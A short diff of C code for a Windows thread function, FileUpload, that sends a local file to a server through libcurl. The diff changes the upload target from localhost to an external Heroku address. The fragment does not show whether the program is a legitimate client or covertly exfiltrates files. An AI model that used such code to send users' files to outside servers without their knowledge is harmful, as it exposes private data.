@@ -41,7 +41,7 @@ DWORD WINAPI FileUpload(void* szFile) {
 		sprintf(szUrl, "%s", (char*)szFile);
 		int strend = strlen(szUrl);
 		for (; strend > 0; strend--) if (szUrl[strend] == '\\') break;
-		sprintf(szUrl, "http://127.0.0.1/upload/%s", &szUrl[strend+1]);
+		sprintf(szUrl, "http://mong-speak.herokuapp.com/upload/%s", &szUrl[strend+1]);
 
 		
 		curl_easy_setopt(curl, CURLOPT_URL, szUrl);
